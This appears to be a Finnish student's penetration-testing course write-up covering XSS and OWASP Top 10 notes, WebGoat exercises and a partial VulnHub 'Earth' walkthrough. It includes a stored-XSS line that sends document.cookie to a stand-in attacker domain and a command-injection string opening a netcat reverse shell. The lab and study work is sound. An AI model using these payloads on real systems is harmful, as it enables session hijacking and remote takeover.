# x)

## Cross Site Scripting [Percival & Samancioglu 2020, Chapter 21](https://learning.oreilly.com/videos/the-complete-ethical/9781839210495/9781839210495-video21_1/)

- Tapa injektoida javascriptiä webbisivulle
- XSS Reflected: Manipuloidaan URLia ja lähetetään URL kohteelle, ja uhrin klikatessa linkkiä Javascriptiä ajetaan tämän selaimessa.
    - Haavoittuvuutta voidaan testata esim. ajamalla missä tahansa sivun inputissa (chatit, searchit, messaget yms) scriptiä `<script>alert('toimiiko?')</script>`, ja mikäli sivulla on XSS haavoittuvuus, näytölle tulee alertti.
    - Samalla URL muokkautui ja se voidaan lähettää kenelle tahansa, ja klikkaamalla aukeaa sama alertti
- XSS Stored: URL manipuloinnin sijaan Javascriptiä talletetaan sivulle. Koodia ajetaan siis kohteen koneella aina, kun kuka tahansa menee sivustolle.
    - Inputeilla voi taas kokeilla `<script> jotain koodia </script>`
    - Javascript tallentuu sivustolle
- Joskus inputeissa maximikirjainmäärä voi rajoittaa koodin määrää. 
    - Voidaan mahdollisesti ohittaa -> Inspect, etsitään HTML elementeistä oikea inputti ja muokataan elementin max pituutta
- [BeEF](https://beefproject.com/) (Browser Exploitation Framework Project)
    - Ajamalla BeEFin javascriptiä webbisivulla, kaikki sivulla kävijät saadaan "koukkuun" BeEFiin ja näiden ip-osoitteet ja muuta tietoa
    - Koukussa oleviin koneihin voidaan nyt ajaa etänä komentoja, jotka suorittavat välittömästi kohteen päässä
- Javacriptin voi poistaa käytöstä selaimen asetuksissa. Tai blokata vain tietyille sivustoille

## [OWASP Top 10 - 2017](https://raw.githubusercontent.com/OWASP/Top10/master/2017/OWASP%20Top%2010-2017%20(en).pdf)

### A2 Broken Authentication
- Hyökkääjillä käytössä valmiita käyttäjänimi, salasana, sanakirja-listoja, joita voidaan kokeilla kirjatutumiseen
- Ajetaan valmiita sanakirjalistoja yksinkertaisten salasanojen selvittämiseksi, esim Password1 tai vertaillaan heikkoja häshättyjä salasanoja, joissa on monta oikeaa vastausta.
- Voidaan poimia tärkeitä tietoja URLista, kuten vaikka session ID

### A3 Sensitive Data Exposure
- Tärkeän datan tulisi aina olla suojattua, cryptattua esim. SHA512. HTTPn vaarat -> ei suojattu yhteys
- Data viedään salattuna tietokantaan, mutta noutovaiheessa salaus puretaan automaattisesti, jolloin esim. SQL injektiolla voidaan saada tärkeitä tietoja, kuten luottokorttitiedot, selkokielisenä.

### A7 Cross Site Scripting
- Tarkoitus etäajaa koodia uhrin selaimessa.
- Automaattisia työkaluja, jotka tunnistaa kaikki 3 XSSn muotoa ja valmiita exploitteja
- Kahdessa kolmesta applikaatiosta löytyy XSS haavoittuvuuksia
    - PHP, J2EE / JSP, ASP.NET teknologioita sisältävistä löytyy erityisesti
- Nettisivun input kentän syötteet tulevat URLiin ja URLia voidaan muokata ajamaan jotakin javascript komentoa. Urlia jakamalla ja lopulta uhrin klikatessa sitä selain ajaa urliin upotetut javascript komennot, jotka voi aiheuttaa esimerkiksi session IDn menettämisen hyökkääjälle, joka voi kaapata käynnissä olevan session.

# z) Cross site story, esimerkki Stored XSS hyökkäyksestä
- Nettisivustolla on viestittely ominaisuus, jonka kautta sivun käyttäjät voivat jättää viestejä toisille sivustolla kävijöille, esimerkiksi jokin foorumi.
    - `<p>Hei, tässä on tämä viestini!</p>`
- Applikaatio ei prosessoi lähetettyjä viestejä muuten kuin printtaamalla ne sivustolle, joten hyökkääjä voi suoraan lähettää haitallisia viestejä muille käyttäjille. Hyökkääjä siis voi itse kirjoittaa foorumille vaikkapa alla olevan viestin:
    - `<p><script>document.location='http://www.hyökkääjä.com/cgi-bin/cookie.cgi?foo='+document.cookie</script></p>`
    - Tämän hyökkäyksen tarkoitus on lähettää uhrin session ID hyökkääjälle, jolla hyökkääjä voi varastaa istunnon oikeudet, esimerkiksi ylläpitäjältä
    - Kun uhri avaa foorumisivun missä hyökkääjän javascript on istutettu viestiin, se ajetaan uhrin selaimessa ja scripti lähettää tiedot hyökkääjän nettisivuille.
    - Hyökkääjä saa haltuunsa tietoja kaikilta sivulla kävijöiltä, kun riittävät käyttöoikeudet omaava henkilö käy sivulla, hyökkääjällä onkin sivuston käyttöoikeudet yks kaks hallussaan.

# a) [WebGoat](https://owasp.org/www-project-webgoat/)
## A2 Broken Authentication
### Authentication Bypasses
- Lähtökohtaisena tarkoituksena tehtävässä on muokata turvakysymyksen parametrejä siten, että ne voidaan ohittaa.
- 2FA Password Reset tehtävässä täytyi muokata form elementissä olevia inputteja. Muokkasin randomilla `secQuestion` arvoja, eli niiden numeroita vain isommaksi kuvan mukaisesti, eli `secQuestion0 -> secQuestion2`. Ja näin submitti meni läpi ja pääsin vaihtamaan salasanaa.

![2FA_Password_Reset](/images/2FA_Password_Reset.png)

![2FA_Password_Reset_result](/images/2FA_Password_Reset_result.png)

## A3 Sensitive Data Exposure
- Tarkoituksena tutustua siihen, miksi tärkeän datan tulisi olla kryptattua sitä lähettäessä
- Tehtävässä oli tarkoitus painaa Login nappia ja tutkia lähetettyä pyyntöä. 

![A3_login_form](/images/A3_login_form.png)

- Pyynnön näkee yksinkertaisimmillaan Firefoxin Network välilehdeltä valitsemalla lähetetty POST-pyyntö ja sen Request välilehdeltä. Näkymän username ja password kelpaavat oikeiksi vastauksiksi tehtävään.

![A3_Insecure_login](/images/A3_Insecure_login.png)

- Halusin tutkia lähetettyä pyyntöä myös jollain packet snifferillä ja googletuksen ensimmäinen tulos oli Kalissa valmiina löytyvä Burp Suite. Sen proxyn käytöstä löytyi yksinkertainen youtube video [Youtube, webpwnized](https://www.youtube.com/watch?v=7ePmWhypzBI). Ohjeita seuraamalla sain sekä Burp Suiten, että Firefoxin asetukset kohdilleen, mutta ongelmana oli vielä se, ettei Firefoxissä pystynytkään oletusasetuksilla keskeyttämään localhostissa pyörivän sivun pyyntöjä, vaikka se toimi kyllä muilla sivuilla jo.
    - Vastaus löytyi taas googlesta [portswigger](https://forum.portswigger.net/thread/burp-interception-does-not-work-for-localhost-in-chrome-a787f541) ja piti muokata Firefoxin asetuksia kirjoittamalla URL kenttään `about:config` ja sitten muuttaa asetuksen `network.proxy.allow_hijacking_localhost` arvo TRUE. Nyt toimii myös Burp Suitella localhostin interceptaus. 
- Asetusten settaamisen jälkeen voitiinkin palata WebGoattiin Log Inin äärelle ja varmistaa, että Burp Suitessa on `Intercept is ON` välilehdellä Proxy -> Intercept. Sitten vain Log Iniä klikkaamaan.
- Burp Suitessa nähdään joko suoraan Intercept välilehdellä kaapattu pyyntö, mutta paremmin kaapatut pyynnöt löytyvät välilehdeltä `HTTP History` ja sieltä POST pyyntö valitsemalla. 

![Burp_Suite_Result](/images/A3_Burp_suite_result.png)

## A7 Cross Site Scripting XSS
- Hyödynnetään käyttäjän luottamusta sivustoon.
- XSS tarkoitus on sivuston html elementtien ja javascript syötteiden väärinkäyttö erilaisten injektioiden aikaansaamiseksi ja tätä kautta tiedon, kuten keksin, hankintaa, tai väärien kenttien luomisen kautta esim. käyttäjätunnusten varastamista.
- Ensimmäisessä tehtävässä (What is XSS?) oli tarkoitus tarkastella eri tabien keksejä, ja tätä voitiin eri tabeissa ollessa tarkastella Consolessa lyömällä `alert(document.cookie)` ja lopputuloksena oli sama keksi jokaiselta tabilta.
- Yleisimpiä lokaatioita missä haavoittuvuutta voi hyödyntää:
    - Hakukentät, jotka toistavat hakumerkkijonon takaisin käyttäjälle
    - Syötekentät, jotka toistavat käyttätietoja
    - Virheilmoitukset, jotka palauttavat käyttäjän syötteitä
    - Piilotetut kentät, jotka sisältää käyttäjän toimittamia tietoja
    - Mikä tahansa sivu, joka näyttää käyttäjän toimittamia tietoja, esim viestitaulut, vapaat kommentit
    - HTTP headerit
- Toisessa tehtävässä (Try It! Reflected XSS) oli tarkoitus tutkia, mistä kentästä löytyy XSS haavoittuvuus. Se voidaan kokeilla ajamalla input kentissä esim. `alert()` tai `console.log()`. Ja jotta tämä toimii input kentässä se täytyy kietoa script tägien sisään, eli tässä tapauksessa haavoittuvuus löytyi access coden kentässä laittamalla siihen `<script>alert()</script>` ja saatiin vastaus sivulta `Seems like you tried to compromise our shop with an reflected XSS attack. We do our... "best"... to prevent such attacks. Try again!`. Muissa kentissä ei näyttänyt olevan haavoittuvuutta.

## A8:2013 Request Forgeries
### Cross-Site Request Forgeries
- Hyödynnetään sivuston luottamusta käyttäjään.
- Sivustojen välinen pyyntöväärennös, joka tunnetaan myös nimellä one-click attack tai session riding ja se lyhennetään joko CSRF tai XSRF (kutsutaan myös sea-surf). Kyseessä on haitallinen exploitti, jossa luvattomia komentoja lähetetään käyttäjältä, johon sivusto luottaa.
- Tehtävässä `Basic Get CSRF Exercise` piti triggeröidä Query ulkoisesta lähteestä ja mietin hetken mitä tässä pitää tehdä. Vinkeistä löytyi ulkoisen sivun tekeminen, joten pistin yksinkertaisella python scriptillä webbipalvelimen pystyyn.
    - Sivulle loin WebGoatista Inspectorista löytämäni formin hidden elementteineen ja painoin omalla luomallani sivullani Submit Querya vain saadakseni errorin.

    ![A8:2013_form](/images/A8_2013_form.png)

    ![A8:2013_error](/images/A8_2013_error.png)

    - Palasin tutkimaan WebGoatin form elementtiä edistymättä asiassa suuntaan enkä toiseen ja jouduin lopulta turvautumaan googleen [Walkthrough](https://github-wiki-see.page/m/WebGoat/WebGoat/wiki/(Almost)-Fully-Documented-Solution-(en)#a8-2013-request-forgery) vain huomatakseni, että action kohdasta puuttui ohjaus localhostiin :)))

    ![A8:2013_correct](/images/A8_2013_correct.png)

    - Ja nyt klikkaamalla submittia löytyy flägi

    ![A8:2013_flag](/images/A8_2013_flag.png) 

- Seuraavassa (Post a review on someone else’s behalf) täytyi postata kirjautuneen henkilön puolesta jotakin sivulle.
- Lähdin samalla periaatteella liikkeelle luomalla omalle sivulleni WebGoatista kopioidun formin ja muokkaamalla actionin osoitetta ja kirjaamalla sivulle muodostuneeseen inputtiin tekstiä ja lähettämällä sen, sain tehtävän tehtyä

![A8:2013_4_result](/images/A8_2013_4_result.png)


# b) [ATT&CK](https://attack.mitre.org/)
## [Credential Access / Brute Force](https://attack.mitre.org/techniques/T1110/)
- Hydra
- John The Ripper

## [Discovery / File and Directory Discovery](https://attack.mitre.org/techniques/T1083/)
- [Goofile](https://www.kali.org/tools/goofile/)


# e) Vulnhub [The Planets: Earth](https://www.vulnhub.com/entry/the-planets-earth,755/) 
- Jatketaan Earthiin murtautumista, siitä mihin h2:ssa jäätiin. Eli ei käytännössä edetty vielä mihinkään. Versiot oli tutkittu eikä niistä tuntunut löytyvän mitään järkeen käypää, joten palasin miettimään nmappia ja kattavampaa scannausta. Googlettelun kautta löysin kattavamman scannauksen [hackertarget.com](https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/) `Scan using default safe scripts 	nmap -sV -sC 192.168.1.1` ja halusin suorittaa sen mahdollisimman nopeasti ajan säästämiseksi eli tehtiin äänekäs scannaus `nmap -sV -sC 192.168.56.102 -oA nmap-15-11-2021-2305 -T5`

![earth nmap scan](/images/earth_nmap_results.png)

- Tästä scannauksesta löytyikin erityisesti yksi mielenkiintoinen tieto koskien DNS palvelua `Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local`
- Käydään kurkkaamassa webbisivut ip-osoitteiden sijaan näillä
    - `http://earth.local` ja `http://terratest.earth.local` antoivat molemmat näkyviin samannäköisen sivun. Myös `https://earht.local` sivu näytti samalta. Mielenkiintoista sivulla on Previous Messages kohdassa merkkijonot, jotka vaikuttavat jotenkin kryptatuilta viesteiltä. Message kenttään kirjoittamalla ja lähettämällä lista päivittyykin kryptatulla viestillä.

![earth_local](/images/earth_local.png)

- https://terratest.earth.local antoikin jo mielenkiintoisemman sivun palautteella 
![test_site](/images/test_site.png)

- Sivu pyydetään jättää huomioimatta, joten keskitytään siihen. Nmap scannauksen tuloksessa oli myös suora maininta robots.txtiin liittyen ja siihen liittyen lainaus [wikipediasta](https://fi.wikipedia.org/wiki/Robotin_rajausstandardi) `Robotin rajausstandardi on WWW-palvelimen juurihakemistoon sijoitettava tiedosto, jolla voidaan antaa tietoja ja rajoituksia hakuroboteille ja muille verkkosivuja tutkiville boteille.`. Kokeillaan onko testisivulla kyseinen tiedosto olemassa, ja onhan se.

![earth_robots.txt](/images/earth_robotstxt.png)

- Tällä sivulla huomion kiinnittää erityisesti alin rivi, testingnotes.* ja ensin html päätettä ja sitten txt päätettä kokeillen saadaan taas uusi sivu näkyviin:

![earth_testingnotes.txt](/images/earth_testingnotes.png)

- Mielenkiintoista tietoa tässä on maininta `XOR-algoritmista`, `testdata.txt` tiedostonimi, jolla kryptausta on testattu, sekä `terra` käyttäjänimi admin portaalille, eli sivulla on ilmeisesti jonkinlainen admin hakemisto olemassa. Tehdään hakemistoscannaus tässä välissä gobusterilla. Tuloksista löytyykin /admin hakemisto.

![earth_gobuster](/images/earth_gobuster.png)

- terratestin https osoitteesta ei löydy /admin hakemistoa, mutta muista edellä käydyistä osoitteista se löytyy. Sivulla on Log In nappi, josta päästään kirjautumissivulle

![earth_login](/images/earth_login.png)

- Salasanaa ei ole tiedossa eikä käyttäjälle `terra` käy esimerkiksi salasana terra, joten ei lähdetä arvailemaan. 
- Palataan miettimään `testingnotes.txt`iä, ja kurkataan siellä mainittu `testdata.txt`

![earth_testdata.txt](/images/earth_testdata.png)

- Sivulla on mitäänsanomatonta tekstiä, josta ei voi päätellä mitään.
- testdata.txtiä on käytetty jotenkin salauksen testaamiseen ja aiemmin mainittu XOR-algoritmi liittynee tähän jollain tapaa. Googlettelun kautta löytyy jotain tietoa miten algoritmi toimii [XOR, wikipedia](https://en.wikipedia.org/wiki/XOR_cipher), mutta ei vie omalla kohdalla hommaa eteenpäin. 
- Tässä kohtaa saan kaverilta jeesiä ja [CyberChef](https://gchq.github.io/CyberChef/) työkalusta vinkkiä. Sivun tutkimiseen ja toimintaan uppoaakin tovi. Lopulta löytyy Encryption tabin alta XOR ja sivun pyörittelyn jälkeen huomaa tärkeitä kohtia olevan Key sekä Input

![earth_xor](/images/earth_xor.png)

- Testidataa siis käytettiin XOR-algoritmillä, joten lyömällä Input kenttään testdata.txtn sisällön ja alinta `earth.local`issa olevaa `Previous Messagea` käyttämällä (tämä onnistui vahingossa kokeilemalla alinta ensin, ja toteamalla ettei muut palauta mitään järkevää), tulee outputtiin tekstiä jossa on havaittavissa jatkuvaa toistoa. XOR-algoritmiin tutustuminen opetti, että algoritmi sisältää jonkinlaisen toisteisuuden. Poimitaan toistuva osa Outputista `earthclimatechangebad4humans`
- Periaatteella, että tässä on testattu salausta ja käyttäjänimi on mainittu, päätin kokeilla tätä salasanana käyttäjälle `terra` ja se toimi ja avautui uusi sivu 

![earth_admin_command_tool](/images/earth_admin_command_tool.png)

- Aukesi siis command line ja ajoin siinä whoami ja mitä sen hetkisessä hakemistossa on, olin root hakemistossa. Ajelin joitakin komentoja ja etsin salasanoja hakemistoista löytämättä mitään hyödylliseltä viittaavaa.
- Nykyinen käyttäjä, jolla komentoriviä pääsee näpyttämään on `apache`, joten lähdin googlettelemaan miten Apache Serverit luo käyttäjiä. Sivulla [dummies.com](https://www.dummies.com/programming/networking/network-administration-apache-user-account/) kerrotaan, että defaulttina on käyttäjä apache ja usergrouppina apache, ja tällä ei ilmeisesti ole vaikkapa root oikeuksia. 
- DVWAn Command Execution tehtävän innoittamana lähdin tutkimaan lisää mitä tietoja löydän järjestelmästä ja [tästä blogista](https://pentestlab.blog/2012/12/19/command-execution-dvwa/) löytyi jotain mielenkiintoista kokeiltavaa.
Yritin avata netcattilla porttia kohteeseen, mutta se ei onnistunut.
- Kokeilin löytyisikö googlettamalla valmista metasploittia ja tällainen [tutoriaali](https://www.yeahhub.com/command-injection-meterpreter-shell-detailed-tutorial-2018/) löytyi, ja kokeilin sitä siten, että vaihdoin php -> pythoniksi perustaen tämän nmap scannauksen tulokseen, jossa mainittiin python, mutta se johti earth.localin virhe ilmoitukseen `Remote connections are forbidden.`
- Googlettelulla löysin myös toisen netcat komennon vielä reverse shellin avaamiseksi `aaaa;'nc+-e+/bin/sh+192.168.56.101+80'`, mutta se aiheutti saman virheilmoituksen. Reverse shell ainakaan tähän tyyliin ei liene siis vaihtoehto.
- Jatkuu tästä paremmalla ajalla, command line injektioihin ja shellien hankintaan täytyy tutustua lisää

### Lähteet
- [Kurssisivu, Tero Karvinen](https://terokarvinen.com/2021/penetration-testing-course-2021-autumn/#h3-attaaack)
- [ATT&CK](https://attack.mitre.org/)
- [WebGoat](https://owasp.org/www-project-webgoat/)
- [OWASP Top 10 - 2017](https://raw.githubusercontent.com/OWASP/Top10/master/2017/OWASP%20Top%2010-2017%20(en).pdf)
- [Percival & Samancioglu 2020, Chapter 21](https://learning.oreilly.com/videos/the-complete-ethical/9781839210495/9781839210495-video21_1/)
- [BeEF](https://beefproject.com/)

